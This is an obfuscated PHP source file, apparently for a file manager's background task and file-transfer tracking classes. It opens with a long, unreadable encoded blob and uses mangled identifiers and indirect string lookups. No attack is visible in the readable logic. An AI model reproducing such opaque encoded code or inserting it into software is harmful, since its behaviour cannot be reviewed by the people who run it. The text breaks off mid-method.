TÙîÄ>d@v¸').base64_decode('kMYyTThlWmAmoOlp7CECio/FlW8Quj2AujWEyHtxrsCEDFBszOrETYZQls3PaEVn').strrev('ê\'Ôìk¯³ÂtVyµnJ İqß/ñŠ[„ÊŒéYCÓ‡?8tËyS¶€%R(bt»4')."\x64\xc4\x2d\xb9\xc4\x62\x7a\xa2\x5e\xe5\x3b\x72\x42\x3b\xec\x90\x65\x7e\xca\x85\x5e\x1a\x9e\xc6\xa4\xa4\xad\x54\xe3\xb\x50\x88\x17\x1\xd2\xc1\xd2\x33\xa6\x45\x24\xc\x92\x1f\x8a\x92\x93\xd0"."\163\162\64\152\162\311\12\276\261\322\153\124\201\135\377\110\333\34\257\172\304\363\127\144\107\102\222\73\163\24\223\374\326\113\44\240\277\131\341\264\243\112\153\246\221\31\122\2"."\xc9\x5f\x8b\x8c\xf4\xc8\xf7\x24\xa3\x10\x22\xd2\x48\x56\xd2\xfc\x9a\xc5\x43\xdc\x31\x3b\x13\x45\xa6\x9d\x98\xe1\x8\xae\x80\xf8\x74\xc1\x3d\xb0\xe5\x34\x54\x2d\x76\x39\x2c\x7a\x26\x17\x21\xdf"."\254\52\102\323\60\371\42\74\243\310\51\66\166\110\337\317\246\255\126\112\215\117\221\44\151\104\63\334\77\24\214\216\30\44\110\230\324\231\202\246\277\171\246\177\126\63\15\313".strrev('®$}W:İ%˜ğÈ<Ióá†8‚Má·ˆ«.”Ç‘>B7¨ĞÅ«0´‚ö¼'."\0".'Œ(F')._kodDe('MFJCGCL4YjSWvBJNvosZ/nzcPNdiaJ6OIM+L9TzjDR+QicLXeSrAQuDd8LYN5awXNw==')."\xd1\xf\xa1\xc8\x8b\x40\x26\xf5\x84\x2f\xd\x8c\xd0\x8d\xa0\x4e\x66\x98\x46\x32\xc7\x4b\x2\x9c\x32\x39\xb0\x5a\xbf\x22\xc0\x35\xb2\xc1\x3c\x17\x1e\x10\x6d\x68\xc4\xe6\xb9\x2e\x89\x56\xef\x24"."\x37\xa2\xc4\xda\x4f\xf8\x50\xe4\x9a\xab\xb6\x1c\x61\xa9\x7c\x71\xda\xae\x8\xd5\xf6\x72\x95\xe6\x20\x9e\x6b\x5c\x67\x96\xb6\x4c\xf2\xd2\xd7\xd3\x17\xe4\xa0\x76\xbe\x3d\x29\xd3\x2e\x7c\x5b\x75"."\60\225\52\361\352\375\170\321\310\50\321\170\167\244\43\24\355\214\44\227\52\71\335\121\204\42\10\171\277\302\275\225\211\170\221\16\74\133\325\151\376\224\2\16\372\323\210\102"."\xf7\x67\x39\x3f\x63\xb\xce\x45\xd2\x79\x93\xde\xac\x72\x57\x4b\xd7\x9f\x6e\x55\xd5\x58\xc2\x6\x34\x85\xaa\x32\x58\x68\x5a\x23\x77\x41\x48\x13\xa5\xcc\x65\x4b\xaf\xce\x3f\xa9\x93\x67\xeb\x45"."\x8b\xa5\x2\x95\x1a\xad\x81\xfc\xb5\xbf\x40\xde\xbb\x90\x73\x23\xc2\x43\x2f\x4d\xd5\x78\xa3\x34\x66\xd8\x86\xd8\xf8\xac\xc4\xa4\x5c\x7b\xa8\xb3\x37\x12\x53\x43\xd1\x68\x7c\xb9\x4b\x37\x50\x88"."\x8b\x2d\xfe\xba\x48\x56\x7e\x8c\x44\x9a\x19\x31\x9\xf4\xeb\xd5\x2e\xd7\xc0\x61\x95\xec\x13\xde\x23\xc0\xa0\xd3\x27\xbb\xde\x2b\xb3\xcb\xf\x78\x7d\x91\xbf\x4d\x40\xa3\xd2\xcb\x42\x65\x4b\x33"."\154\135\2\320\7\157\246\203\275\212\126\50\270\336\24\54\14\113\321\212\373\144\255\371\51\225\176\200\301\44\357\176\265\62\44\360\143\361\377\353\246\32\131\341\145\313\310\62"."\x1d\xc\x6e\x5e\x48\x9f\x2d\xe8\x90\xdf\x9f\x64\xdf\xac\x7a\x3d\xe9\x73\xdf\x61\xf2\x49\xfe\x7c\x88\xc7\x22\xf6\x1c\x9c\x49\xd8\xf\xa0\x8d\x29\x2c\x12\x57\xa9\xeb\x1e\xf1\x9\xc4\x18\x5b\x93"."\x65\xf9\xbe\x2e\x98\xd\xf2\x21\xa6\x1\xec\x4c\x30\xcc\x2e\x89\x70\x44\x30\x2\x38\x3b\xd4\x86\x3f\x47\xd9\x43\xc4\xf5\x62\x71\x17\x63\x19\x98\xae\x27\xc2\x13\x30\xce\xae\xfb\x6a\xcf\x8b\x52"."\136\265\130\327\23\356\125\337\40\217\27\320\264\1\334\35\224\163\110\164\16\305\370\123\44\242\250\67\245\106\3\120\262\42\244\111\74\203\322\252\64\321\307\315\370\343\22\312".strrev('”ØiF´üCÕqv²ŠB%ÀdâÌ‰5„kt¡'."\0".'PÜÒïúÈ÷:ÅÇe‹…Ü@>-,f"').base64_decode('x48gZGzMQJ8opDy6D/E2ulP9QhEt/v+lIE1MSgqZ7kqqG2R7jzpBduHHl/LmuPud').base64_decode('QgzxPrfkemhJ2jTEpld+GspdyFf1xIlCHqBV0FKHWcQOohgPSDJLn55Gfwbhlx1n')."\336\106\120\104\5\237\154\344\213\252\43\157\24\262\26\127\215\21\200\136\135\60\346\244\24\326\16\321\230\317\124\362\152\133\47\303\311\360\252\112\255\7\271\260\53\77\367\63".base64_decode('MeL1HXF2ut8n4Re8ttgMtuN6/yZlprScj1JkGKuJWPukHJbVYUkvUCITnmX5fC+W').strrev('ÉE\\Yrµ+¨–¸¦â/¦\\Ê5A!ZÓ0W:\\§ñÆ¤[gŞuE&ò>²ïg°2').strrev('QÙäa;«Ó2«\'ŸZ‚ïşT"”ªĞ¸@¢ÄºNkczUè,JTş´„=²ëú&G')."\73\373\350\135\35\14\230\134\45\273\77\345\302\350\56\351\101\366\140\365\175\53\326\225\3\214\42\253\222\302\205\167\100\146\304\40\203\262\110\21\113\303\265\221\361\122\102\324".base64_decode('sI8ECKaQCffPgPIV7H4SiC518tOpD3MuBsfFaS67/RDaFd5X7dhn+KN8Ptoz8Rgr').base64_decode('fYLPx5/b81GPkT54ZM8njBU/61UhYVLnfpwZt5nrXlaxE15Ogg+Vp0DCO3Aps1rG').base64_decode('Km6ZS5WiuK1HETdnVdVhqYcVq+Ajd+w+5iTPMxyiV/LM1BjDz6+DquASdinrxlct')."\x8b\xd2\x16\xbb\xa7\xf4\x66\x33\x5c\xab\x4e\xb5\x74\x61\x67\x43\xfd\x97\x56\xa1\xf6\x95\xc5\xec\xcc\x59\x73\x16\xc8\x62\x9\x31\x3f\xe2\x52\x8f\x79\xa9\xa7\x3f\x40\x67\x88\x19\x57\xdc\xeb\x49"."\x61\x4e\x53\xe5\x7d\x4b\x12\xdd\xda\xd1\xd5\xaf\x61\x7a\x70\xf7\xff\x6e\xe5\xb\xba\x9f\x66\x95\x74\x95\xab\x5f\x15\xae\x1a\x1\xb2\x8\x25\x2d\x1e\xe9\x28\xf3\xa8\x6c\x98\x58\xa7\xc2\x16\xdb"."\207\36\136\342\15\114\367\267\350\301\137\243\37\322\211\45\166\2\175\242\320\54\140\356\270\210\245\334\216\245\271\131\301\132\34\17\31\11\306\136\31\344\245\160\335\333\166\62"."\60\40\7\21\311\22\113\44\327\350\230\136\41\16\56\216\117\64\42\103\214\227\12\160\340\142\43\154\261\247\44\224\362\277\230\100\306\335\120\106\110\50\354\324\350\171\160\11"."\303\33\65\236\240\224\364\37\76\243\335\224\56\343\234\234\137\163\374\322\202\224\4\177\272\23\47\23\14\164\213\140\70\335\175\365\124\217\212\211\72\206\174\312\124\231\252\211"."\63\351\245\112\341\246\113\42\313\160\151\146\220\71\5\277\316\220\223\374\6\247\223\27\214\7\335\241\256\335\52\271\42\226\255\324\110\105\362\66\250\256\132\172\222\120\210\160".base64_decode('iMwHOgF7mHglJZaKoW5uvahJSlZuuRIeXekVWlMOi1HH+DzOXMGir7v4QhTv9LxQ').base64_decode('TLCS99liNkQEFQgsJxnBupgQ/mybiymxvS8zItJMdtKMonwTwHEK6JBos9OvSael')."\70\30\105\50\126\51\212\210\44\214\45\374\17\117\164\331\12\143\167\123\236\235\317\54\220\155\317\73\255\324\321\56\15\63\62\375\377\367\123\204\377\267\136\40\234\303\37\300"."\x70\xbd\x73\xdc\xd\xc4\x32\xa3\xcf\xd6\x4a\x2e\xba\xa9\xc8\xd6\xd3\xf\xf7\xa1\xb9\xf\xac\x22\xfe\xa4\xb7\x14\xe7\x2a\xbb\xcc\xe5\x18\xf3\x44\xa6\xb1\xab\x22\xad\x50\x90\x8e\xd6\xda\xec\x45"."\325\3\261\150\361\215\360\327\105\153\105\274\246\161\336\307\142\7\330\263\353\344\35\330\241\132\31\5\346\341\134\114\215\165\114\101\214\170\55\125\337\354\342\371\212\272\35\134"."\113\104\106\125\66\361\125\104\213\60\357\155\101\26\312\140\206\215\170\122\200\361\222\155\142\343\145\306\332\65\2\146\37\132\302\320\21\261\260\7\254\44\143\42\27\250\12\177"."\xa5\x5c\xb3\xe0\x2\xca\x3\xc\xb3\x86\x4d\x8a\xd9\x4\xba\x4a\xf4\x7a\x1e\xbb\xa4\x99\x6c\x79\x34\x5d\xc2\xf5\xea\x8b\xfe\xea\xd2\x7c\xe7\xcb\x45\xb0\x6e\xb4\x5b\xde\xc4\x1f\x38\x6f\xf2\xbe"."\x78\xde\xec\xaf\xfe\x18\x35\x4d\xc0\x22\x8f\x4\x16\x32\x30\xb1\x11\xb9\x7f\x21\x17\x9f\x35\xca\xd0\x95\x9a\x14\x79\xa6\xd8\x2b\xb5\x77\x2c\x7f\x64\x54\xc8\xd0\x70\x48\xee\x2f\xdb\xf9\x7d\x96"."\111\10\72\67\224\13\136\44\5\125\351\11\356\151\201\252\363\205\141\73\327\220\43\56\113\134\360\31\46\361\162\317\212\366\367\66\20\53\33\130\261\210\111\350\62\305\334\113"."\357\133\343\75\45\74\105\142\277\136\104\326\47\237\332\314\360\115\322\33\7\220\113\42\147\313\17\212\270\113\142\113\0\367\136\132\134\53\133\306\264\154\51\33\207\327\312\213".base64_decode('V5gscZDT8FvEjmsuxIMF3ocKCB9OWWsXhw13sDJIuqJExHbW/fIJSSRg5lQUapAu')."\331\334\167\234\334\221\173\25\246\254\30\121\51\231\224\142\276\352\320\57\66\16\214\10\17\24\44\231\136\37\204\244\147\256\275\245\334\317\243\113\67\242\31\262\362\302\325\227"."\136\342\56\116\242\63\130\61\314\11\211\43\300\3\257\365\300\367\260\66\46\210\44\101\213\147\263\135\332\130\215\254\131\306\215\160\50\202\360\254\204\310\222\354\215\205\32\273"."\76\356\175\361\70\40\333\50\273\62\126\103\205\75\262\124\136\134\177\210\156\142\130\255\356\223\215\346\56\56\333\73\363\105\45\100\364\355\12\256\57\45\361\75\330\34\103\50".base64_decode('UtGucCZefNJtXc2z8TlDeYjxi98F9XByWCTCKAZPEkgQpOprChqkJaAXolJ18iXo')."\224\5\222\265\77\42\126\245\173\210\45\263\164\221\300\216\72\323\65\370\22\212\344\35\203\234\11\71\321\325\34\357\324\22\46\104\54\137\12\54\22\1\54\115\13\271\223\150"."\176\335\323\172\271\200\267\147\264\204\75\156\70\231\274\304\31\125\47\126\303\255\252\101\205\17\325\156\257\267\125\154\114\275\374\242\250\244\252\75\222\46\105\312\254\121\206\266"."\xa8\x66\x31\x9a\x84\x4b\xa\x72\xd5\x55\x76\x8a\x21\xc0\x65\x69\x12\x2e\x5b\x95\xcc\xa\x4b\xe2\x15\xa9\x9c\xa3\x55\xec\x29\xba\x57\x3d\x78\x20\x73\xc8\xd6\xe8\xb0\x87\x33\xa7\x59\xa7\x1a\xcf"."\232\231\253\77\7\53\316\233\233\10\51\152\267\102\310\26\74\67\332\265\132\121\63\363\224\255\20\271\75\247\100\55\134\313\122\152\140\127\241\332\120\215\307\105\132\15\105\13"."\x5a\x27\x3e\xa3\x65\x17\x55\x35\x92\x65\xad\x8d\xda\x7a\x1d\x89\x9a\x5b\xdf\x76\x2b\x5c\x78\xe0\xf2\xc0\x80\xab\x53\xa0\xae\x60\xb5\x21\x4e\xb1\x60\x8c\x8\x1d\x34\xa6\x49\x3e\xcd\x85\xdf\x2b"."\245\221\222\311\317\214\254\320\17\304\272\315\41\313\73\220\125\265\271\327\151\251\42\171\217\255\251\330\356\303\174\175\65\7\135\140\157\31\312\26\1\224\345\61\35\43\243\273".base64_decode('XdTKnqpoOvtIQZINesRyQsrgUgioIbgiIKDrhPib1idRLGJNuCwxKJ0AVwL0NrED').strrev('YmÈ£p.$(#ÊIôpøƒ¶S®ÜG7mù2Ì¥§Zi94«•^â${óZß').base64_decode('tgS9kCDca2J+OanTVIKUXBF8y8Ej8tkH95tdFc8NrAAg5jRtTjDnldigW7QHX0xI')."\x43\x26\xe8\x13\x58\x7e\xb2\xfa\xb\x31\x95\xb7\x83\x34\x25\x8\x8f\x1e\xf8\x35\x4c\x28\xc2\x7b\x6a\x81\x35\xe5\x9c\xab\x38\x7d\x95\x8a\xab\x85\x7e\x56\xd\x20\x45\x15\x55\x50\x8f\xe7\x44\xd6"."\5\46\63\311\124\262\52\251\57\224\114\56\217\47\72\251\203\364\252\144\122\112\122\47\252\112\352\353\211\307\246\112\13\367\206\42\321\252\64\254\171\24\123\205\163\61\232\24".base64_decode('6SOtJNd3U7Ui0rFUtIRcFAvhfDlvMpk7u7xIagXGpUv2n3pReJUTZUpGZkQI9zSJ')."\x78\xb7\x99\xfb\x47\x1e\x70\xbf\x42\xe4\x51\xf0\x63\x8b\x14\x2a\xc2\x5a\x43\x31\xa8\x3b\x51\x6\x28\x76\x18\xcf\xf7\x3a\x27\xa4\xc5\xcd\x77\xc0\x75\x43\x2e\xc1\xc9\x7e\x20\x8\x46\x5a\x73\xf2"."\101\113\0\323\153\16\220\54\330\255\276\150\40\251\142\0\160\303\216\67\101\345\154\215\231\226\56\22\50\33\3\326\230\60\244\222\146\30\15\273\222\35\55\127\363\242\230\112"."\363\360\216\27\162\266\377\3\214\376\163\326\67\253\0\0"."".base64_decode(''), 10, -8))); goto fÚÀ°ï­ƒ¨; d´àß¶”ªÓ: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\156\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($å®¶Ğá‡, $şÀúÅˆÅ = '', $·š‚Úü = 0, $Ö‚Ú…Œ = '') { $éş‚œ„× =& $_SERVER[Ì¥ŞÒ°£]; if (self::get($å®¶Ğá‡)) { return; } $ÑØÛ•Öà = defined($éş‚œ„×[475]) ? USER_ID : $éş‚œ„×[197]; $this->task = array($éş‚œ„×[399] => $å®¶Ğá‡, $éş‚œ„×[1667] => $ÑØÛ•Öà, $éş‚œ„×[1567] => $Ö‚Ú…Œ, $éş‚œ„×[453] => $éş‚œ„×[12], $éş‚œ„×[33] => $şÀúÅˆÅ, $éş‚œ„×[1069] => $éş‚œ„×[12], $éş‚œ„×[788] => $·š‚Úü, $éş‚œ„×[1668] => 0, $éş‚œ„×[1669] => 0, $éş‚œ„×[1670] => 0, $éş‚œ„×[1671] => timeFloat(), $éş‚œ„×[1672] => 0, $éş‚œ„×[1673] => 0, $éş‚œ„×[1674] => 0, $éş‚œ„×[1675] => 0, $éş‚œ„×[752] => $éş‚œ„×[1626]); $GLOBALS[$éş‚œ„×[1676]] = 1; Hook::bind($éş‚œ„×[1631], array($this, $éş‚œ„×[1677])); Hook::bind($éş‚œ„×[1678], array($this, $éş‚œ„×[1679])); $this->startAfter(); Hook::trigger($éş‚œ„×[1680], $this->task); $this->task[$éş‚œ„×[1673]] = timeFloat(); } public function end($Í÷‰¥óÇ = '') { $¾®ÑÍœ½ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¾®ÑÍœ½[1673]]) { self::valueSet($this->task[$¾®ÑÍœ½[399]], !1); } $this->isEnd = !0; if ($Í÷‰¥óÇ) { $this->task[$¾®ÑÍœ½[453]] = $Í÷‰¥óÇ; } self::log($¾®ÑÍœ½[1681] . $this->task[$¾®ÑÍœ½[399]] . $¾®ÑÍœ½[1682] . sprintf($¾®ÑÍœ½[1683], timeFloat() - $this->task[$¾®ÑÍœ½[1671]]) . $¾®ÑÍœ½[1684]); Hook::unbind($¾®ÑÍœ½[1631], array($this, $¾®ÑÍœ½[1677])); Hook::unbind($¾®ÑÍœ½[1678], array($this, $¾®ÑÍœ½[1679])); $this->endAfter(); $Ê‰ ıÚ÷ = $this->task; $this->task = !1; Hook::trigger($¾®ÑÍœ½[1685], $Ê‰ ıÚ÷); } public function update($‚ Úû˜Ê = 0, $ñ×¸ñ´ = false) { $¬âÚ¢ÓŞ =& $_SERVER[Ì¥ŞÒ°£]; $°–ğÙ°± =& $this->task; if (!$°–ğÙ°±) { return; } $°–ğÙ°±[$¬âÚ¢ÓŞ[1668]] += $‚ Úû˜Ê; $°–ğÙ°±[$¬âÚ¢ÓŞ[1672]] = timeFloat(); if ($°–ğÙ°±[$¬âÚ¢ÓŞ[788]]) { if ($°–ğÙ°±[$¬âÚ¢ÓŞ[788]] < $°–ğÙ°±[$¬âÚ¢ÓŞ[1668]]) { $°–ğÙ°±[$¬âÚ¢ÓŞ[788]] = $°–ğÙ°±[$¬âÚ¢ÓŞ[1668]]; } $‡ÕòÔŸÕ = timeFloat() - $°–ğÙ°±[$¬âÚ¢ÓŞ[1671]] - $°–ğÙ°±[$¬âÚ¢ÓŞ[1674]]; if ($‡ÕòÔŸÕ <= 0) { $‡ÕòÔŸÕ = 0.001; } $°–ğÙ°±[$¬âÚ¢ÓŞ[1669]] = $°–ğÙ°±[$¬âÚ¢ÓŞ[1668]] / $°–ğÙ°±[$¬âÚ¢ÓŞ[788]]; $°–ğÙ°±[$¬âÚ¢ÓŞ[1670]] = $°–ğÙ°±[$¬âÚ¢ÓŞ[1668]] / $‡ÕòÔŸÕ; if ($°–ğÙ°±[$¬âÚ¢ÓŞ[1669]] > 0) { $°–ğÙ°±[$¬âÚ¢ÓŞ[1675]] = $‡ÕòÔŸÕ * (1 - $°–ğÙ°±[$¬âÚ¢ÓŞ[1669]]) / $°–ğÙ°±[$¬âÚ¢ÓŞ[1669]]; } $°–ğÙ°±[$¬âÚ¢ÓŞ[1675]] = $°–ğÙ°±[$¬âÚ¢ÓŞ[1675]] <= 0 ? 0 : $°–ğÙ°±[$¬âÚ¢ÓŞ[1675]]; } $this->updateAfter(); $èâ•í‰ã = 0.2; if (timeFloat() - $°–ğÙ°±[$¬âÚ¢ÓŞ[1673]] < $èâ•í‰ã && !$ñ×¸ñ´) { return; } $ÈŸ ³¾ = self::get($°–ğÙ°±[$¬âÚ¢ÓŞ[399]]); $ÖáõµÑõ = $ÈŸ ³¾[$¬âÚ¢ÓŞ[752]]; if ($ÖáõµÑõ == self::STATYS_KILL) { $êÕ€§• = array($¬âÚ¢ÓŞ[1686] => LNG($¬âÚ¢ÓŞ[1687]), $¬âÚ¢ÓŞ[1218] => !1); Cache::set($¬âÚ¢ÓŞ[1688] . $this->task[$¬âÚ¢ÓŞ[399]], $êÕ€§•, 30); $this->onKill(); $this->end(); die; } else { if ($ÖáõµÑõ == self::STATYS_STOP) { $óš×çèû = 2; $ÈŸ ³¾[$¬âÚ¢ÓŞ[1674]] += $óš×çèû; self::valueSet($°–ğÙ°±[$¬âÚ¢ÓŞ[399]], $ÈŸ ³¾); sleep($óš×çèû); $this->update(); return; } } $°–ğÙ°±[$¬âÚ¢ÓŞ[752]] = $ÖáõµÑõ ? $ÖáõµÑõ : $°–ğÙ°±[$¬âÚ¢ÓŞ[752]]; $°–ğÙ°±[$¬âÚ¢ÓŞ[1674]] = $ÈŸ ³¾[$¬âÚ¢ÓŞ[1674]] ? $ÈŸ ³¾[$¬âÚ¢ÓŞ[1674]] : 0; $°–ğÙ°±[$¬âÚ¢ÓŞ[1673]] = timeFloat(); Hook::trigger($¬âÚ¢ÓŞ[1689], $°–ğÙ°±); self::valueSet($°–ğÙ°±[$¬âÚ¢ÓŞ[399]], $°–ğÙ°±); } public function onKillSet($û¢†ãİş, $ß¥í¸ïµ = array()) { $this->onKillCall = array($û¢†ãİş, $ß¥í¸ïµ); } public function onKill() { $×Ä·· =& $_SERVER[Ì¥ŞÒ°£]; self::log($×Ä··[1681] . $this->task[$×Ä··[399]] . $×Ä··[1690]); Hook::trigger($×Ä··[1691], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ë×Ïˆİæ) { $–òî„îß =& $_SERVER[Ì¥ŞÒ°£]; Cache::set($–òî„îß[1688] . $this->task[$–òî„îß[399]], $Ë×Ïˆİæ, 60); return $Ë×Ïˆİæ; } public static function get($ÈÍ»Ôàõ) { $ğ£â©® =& $_SERVER[Ì¥ŞÒ°£]; $¬¢ìšŠÊ = self::valueGet($ÈÍ»Ôàõ); if (is_array($¬¢ìšŠÊ) && $¬¢ìšŠÊ[$ğ£â©®[1692]]) { $ªÚˆ‘øÖ = ActionApply($¬¢ìšŠÊ[$ğ£â©®[1692]], array($¬¢ìšŠÊ)); $¬¢ìšŠÊ = is_array($ªÚˆ‘øÖ) ? $ªÚˆ‘øÖ : $¬¢ìšŠÊ; } return $¬¢ìšŠÊ; } public static function listData() { $¥Ôï±ã¸ = self::valueGet(); return array_sort_by($¥Ôï±ã¸, $_SERVER[Ì¥ŞÒ°£][1671], !0); } public static function kill($ƒü÷—) { return self::changeStatus($ƒü÷—, self::STATYS_KILL); } public static function stop($ß”öÕÚ) { return self::changeStatus($ß”öÕÚ, self::STATYS_STOP); } public static function restart($ôÊÈùˆ‰) { return self::changeStatus($ôÊÈùˆ‰, self::STATYS_RUNNING); } public static function killAll() { $ïñ„¼¯œ =& $_SERVER[Ì¥ŞÒ°£]; $¬ÜşÌ = self::listData(); foreach ($¬ÜşÌ as $´ŠÑí) { self::kill($´ŠÑí[$ïñ„¼¯œ[399]]); } sleep(2); foreach ($¬ÜşÌ as $´ŠÑí) { self::valueSet($´ŠÑí[$ïñ„¼¯œ[399]], !1); } } private static function changeStatus($ØÉÔã€, $È•Åïƒ) { $ÜÁÓä”× =& $_SERVER[Ì¥ŞÒ°£]; $êÖÁÚˆÎ = self::valueGet($ØÉÔã€); if (!$êÖÁÚˆÎ) { return !1; } $êÖÁÚˆÎ[$ÜÁÓä”×[752]] = $È•Åïƒ; self::valueSet($ØÉÔã€, $êÖÁÚˆÎ); self::log($ÜÁÓä”×[1693] . $êÖÁÚˆÎ[$ÜÁÓä”×[399]] . $ÜÁÓä”×[1694] . $È•Åïƒ); return !0; } public static function valueGet($Ë¹²œ“ = false) { $…½‚Ñğœ =& $_SERVER[Ì¥ŞÒ°£]; $”ÊœŠ¿ú = defined($…½‚Ñğœ[475]) ? USER_ID : $…½‚Ñğœ[197]; if ($Ë¹²œ“) { $É®‰øĞ = Model($…½‚Ñğœ[447])->where(array($…½‚Ñğœ[94] => $Ë¹²œ“, $…½‚Ñğœ[33] => $…½‚Ñğœ[1076]))->find(); return $É®‰øĞ ? json_decode($É®‰øĞ[$…½‚Ñğœ[374]], !0) : !1; } return self::taskListUser($”ÊœŠ¿ú); } public static function taskListUser($«ëÕ´£¾ = false) { $şçç¯üÜ =& $_SERVER[Ì¥ŞÒ°£]; $ƒ¨½Ò£… = array($şçç¯üÜ[33] => $şçç¯üÜ[1076]); if ($«ëÕ´£¾) { $ƒ¨½Ò£…[$şçç¯üÜ[1667]] = $«ëÕ´£¾; } $ÎƒÑùîæ = Model($şçç¯üÜ[447])->where($ƒ¨½Ò£…)->select(); $ÎƒÑùîæ = $ÎƒÑùîæ ? $ÎƒÑùîæ : array(); foreach ($ÎƒÑùîæ as $Ò±¶À¼ı => $„½¶ú£ˆ) { $ÎƒÑùîæ[$Ò±¶À¼ı] = json_decode($„½¶ú£ˆ[$şçç¯üÜ[374]], !0); } return $ÎƒÑùîæ; } public static function valueSet($ıšùºÔ”, $•íş‰Öä) { $€ÒŞ–† =& $_SERVER[Ì¥ŞÒ°£]; if (!$•íş‰Öä) { return Model($€ÒŞ–†[447])->where(array($€ÒŞ–†[94] => $ıšùºÔ”, $€ÒŞ–†[33] => $€ÒŞ–†[1076]))->delete(); } $°÷Ş±¶» = json_encode($•íş‰Öä); if (!$°÷Ş±¶») { ob_start(); var_dump($•íş‰Öä); $Ğ²º¸°õ = ob_get_clean(); self::log($€ÒŞ–†[1695] . json_encode_force($Ğ²º¸°õ)); } if (!$ıšùºÔ” || !$•íş‰Öä[$€ÒŞ–†[399]]) { return !1; } $İÆáæ¶Î = defined($€ÒŞ–†[475]) ? USER_ID : $€ÒŞ–†[197]; $»¾¿ = array($€ÒŞ–†[33] => $€ÒŞ–†[1076], $€ÒŞ–†[1667] => $İÆáæ¶Î, $€ÒŞ–†[94] => $ıšùºÔ”, $€ÒŞ–†[374] => $°÷Ş±¶»); $ÉÆ÷£˜š = $€ÒŞ–†[1696]; CacheLock::lock($ÉÆ÷£˜š); Model($€ÒŞ–†[447])->add($»¾¿, array(), !0); CacheLock::unlock($ÉÆ÷£˜š); } public static function log($¢ºëÈ) { if (!GLOBAL_DEBUG) { return; } write_log($¢ºëÈ, $_SERVER[Ì¥ŞÒ°£][1697]); } } class TaskFileTransfer extends Task { protected function startAfter() { $˜Î¼Õƒ˜ =& $_SERVER[Ì¥ŞÒ°£]; $ï¡”êİì =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($˜Î¼Õƒ˜[1698], array($this, $˜Î¼Õƒ˜[1699])); Hook::bind($˜Î¼Õƒ˜[1229], array($this, $˜Î¼Õƒ˜[1700])); Hook::bind($˜Î¼Õƒ˜[1701], array($this, $˜Î¼Õƒ˜[1702])); Hook::bind($˜Î¼Õƒ˜[604], array($this, $˜Î¼Õƒ˜[1703])); Hook::bind($˜Î¼Õƒ˜[605], array($this, $˜Î¼Õƒ˜[1704])); Hook::bind($˜Î¼Õƒ˜[610], array($this, $˜Î¼Õƒ˜[1705])); Hook::bind($˜Î¼Õƒ˜[611], array($this, $˜Î¼Õƒ˜[1706])); Hook::bind($˜Î¼Õƒ˜[607], array($this, $˜Î¼Õƒ˜[1707])); Hook::bind($˜Î¼Õƒ˜[608], array($this, $˜Î¼Õƒ˜[1708])); Hook::bind($˜Î¼Õƒ˜[574], array($this, $˜Î¼Õƒ˜[1709])); Hook::bind($˜Î¼Õƒ˜[571], array($this, $˜Î¼Õƒ˜[1709])); Hook::bind($˜Î¼Õƒ˜[576], array($this, $˜Î¼Õƒ˜[1709])); Hook::bind($˜Î¼Õƒ˜[578], array($this, $˜Î¼Õƒ˜[1709])); Hook::bind($˜Î¼Õƒ˜[580], array($this, $˜Î¼Õƒ˜[1709])); Hook::bind($˜Î¼Õƒ˜[1710], array($this, $˜Î¼Õƒ˜[1711])); Hook::bind($˜Î¼Õƒ˜[597], array($this, $˜Î¼Õƒ˜[1712])); $this->sourceModelCopyFlag = !1; Hook::bind($˜Î¼Õƒ˜[1713], array($this, $˜Î¼Õƒ˜[1714])); Hook::bind($˜Î¼Õƒ˜[1715], array($this, $˜Î¼Õƒ˜[1716])); Hook::bind($˜Î¼Õƒ˜[1717], array($this, $˜Î¼Õƒ˜[1718])); $ï¡”êİì[$˜Î¼Õƒ˜[1719]] = LNG($˜Î¼Õƒ˜[1720]); $ï¡”êİì[$˜Î¼Õƒ˜[1721]] = 0; $ï¡”êİì[$˜Î¼Õƒ˜[1722]] = 0; $ï¡”êİì[$˜Î¼Õƒ˜[1069]] = $˜Î¼Õƒ˜[12]; $ï¡”êİì[$˜Î¼Õƒ˜[1723]] = $˜Î¼Õƒ˜[12]; $ï¡”êİì[$˜Î¼Õƒ˜[1724]] = 0; $ï¡”êİì[$˜Î¼Õƒ˜[1725]] = 0; $ï¡”êİì[$˜Î¼Õƒ˜[1726]] = 0; if (!$ï¡”êİì[$˜Î¼Õƒ˜[1567]]) { $ï¡”êİì[$˜Î¼Õƒ˜[1567]] = LNG($˜Î¼Õƒ˜[1727]); } } protected function endAfter() { $„Ä–Áİˆ =& $_SERVER[Ì¥ŞÒ°£]; Hook::unbind($„Ä–Áİˆ[1698], array($this, $„Ä–Áİˆ[1699])); Hook::unbind($„Ä–Áİˆ[1229], array($this, $„Ä–Áİˆ[1700])); Hook::unbind($„Ä–Áİˆ[1701], array($this, $„Ä–Áİˆ[1702])); Hook::unbind($„Ä–Áİˆ[604], array($this, $„Ä–Áİˆ[1703])); Hook::unbind($„Ä–Áİˆ[605], array($this, $„Ä–Áİˆ[1704])); Hook::unbind($„Ä–Áİˆ[610], array($this, $„Ä–Áİˆ[1705])); Hook::unbind($„Ä–Áİˆ[611], array($this, $„Ä–Áİˆ[1706])); Hook::unbind($„Ä–Áİˆ[607], array($this, $„Ä–Áİˆ[1707])); Hook::unbind($„Ä–Áİˆ[608], array($this, $„Ä–Áİˆ[1708])); Hook::unbind($„Ä–Áİˆ[574], array($this, $„Ä–Áİˆ[1709])); Hook::unbind($„Ä–Áİˆ[571], array($this, $„Ä–Áİˆ[1709])); Hook::unbind($„Ä–Áİˆ[576], array($this, $„Ä–Áİˆ[1709])); Hook::unbind($„Ä–Áİˆ[578], array($this, $„Ä–Áİˆ[1709])); Hook::unbind($„Ä–Áİˆ[580], array($this, $„Ä–Áİˆ[1709])); Hook::unbind($„Ä–Áİˆ[1710], array($this, $„Ä–Áİˆ[1711])); Hook::unbind($„Ä–Áİˆ[597], array($this, $„Ä–Áİˆ[1712])); Hook::unbind($„Ä–Áİˆ[1713], array($this, $„Ä–Áİˆ[1714])); Hook::unbind($„Ä–Áİˆ[1715], array($this, $„Ä–Áİˆ[1716])); 